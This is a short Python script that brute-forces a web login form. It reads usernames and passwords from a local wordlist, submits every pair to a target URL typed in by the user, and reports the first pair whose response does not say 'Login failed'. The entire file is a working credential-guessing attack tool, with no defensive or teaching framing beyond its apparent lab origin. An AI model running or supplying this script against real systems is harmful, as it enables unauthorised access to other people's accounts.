import requests


def brute_force_login(target_url):
    userlist_path = "/root/Downloads/pwd.txt"
    passlist_path = "/root/Downloads/pwd.txt"

    with open(userlist_path, "r") as userlist_file:
        usernames = [line.strip() for line in userlist_file]

    with open(passlist_path, "r") as passlist_file:
        passwords = [line.strip() for line in passlist_file]

    for username in usernames:
        for password in passwords:
            data = {"username": username, "password": password, "Login": "submit"}
            response = requests.post(target_url, data=data)

            if "Login failed" not in response.text:
                print(f"[+] Successful login: Username: {username} | Password: {password}")
                return

    print("[+] Reached end of list, no valid credentials found.")


if __name__ == "__main__":
    target_url = input("Enter target URL: ")
    brute_force_login(target_url)
